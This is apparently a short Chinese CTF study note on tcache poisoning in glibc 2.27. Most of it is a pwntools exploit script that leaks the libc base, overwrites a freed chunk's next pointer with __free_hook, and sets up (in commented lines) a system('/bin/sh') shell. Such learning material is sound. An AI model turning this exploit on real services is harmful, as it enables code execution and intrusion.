# tcache poisoning

通过覆盖tcache中的next，不需要伪造任何chunk结构即可实现malloc到任何地址

在2.27中加入了tcahe的一个bin他的主要目的时为了帮助提高chunk的反应速度因此

但是在2.27版本刚开始的时候对tcache的检查还是不是那么的严格因此我们可以如同fastbin一样的去使用他

```py
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))

add_chunk(0,0x410)
add_chunk(1,0x10)
delete_chunk(0)
show_chunk(0)
p.recv()
libc.address= u64(p.recv(6)[-6:].ljust(8,b'\x00'))-0x3afca0
info("libc.address: "+hex(libc.address) )
add_chunk(0,0x100)
delete_chunk(0)
edit_chunk(0,p64(libc.sym['__free_hook']))
gdb.attach(p)
pause()

add_chunk(0,0x100)

# gdb.attach(p,"b __libc_malloc\nc")
# add_chunk(0,0x100)
# edit_chunk(0,p64(libc.sym['system']))
# edit_chunk(1,"/bin/sh\x00")
delete_chunk(1)
# gdb.attach(p)

p.interactive()
```

